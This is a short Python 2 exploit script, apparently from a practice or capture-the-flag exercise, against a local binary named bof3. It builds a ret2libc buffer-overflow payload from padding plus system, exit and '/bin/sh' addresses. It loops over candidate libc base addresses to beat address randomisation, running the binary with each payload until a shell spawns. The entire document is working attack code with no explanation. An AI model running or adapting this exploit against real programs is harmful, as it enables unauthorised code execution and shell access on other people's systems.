#!python
from struct import pack
import os
import sys

def p32(p):
    return pack('<I', p)

st = 0xb7500000
en = 0xb7f00000
SYSTEM = 0x00041260 
EXIT   = 0x000337f0
BIN_SH = 0x169b98+5 

while 1:
    for i in range(st, en, 0x1000):
        payload  = "A"*64
        payload += "BBBBCCCCDDDD"
        payload += p32(i + SYSTEM)
        payload += p32(i + EXIT)
        payload += p32(i + BIN_SH)

        print "paylaod: %s" % repr(payload)
        open('output', 'wb').write(payload)
        os.system('./bof3 `cat output`')

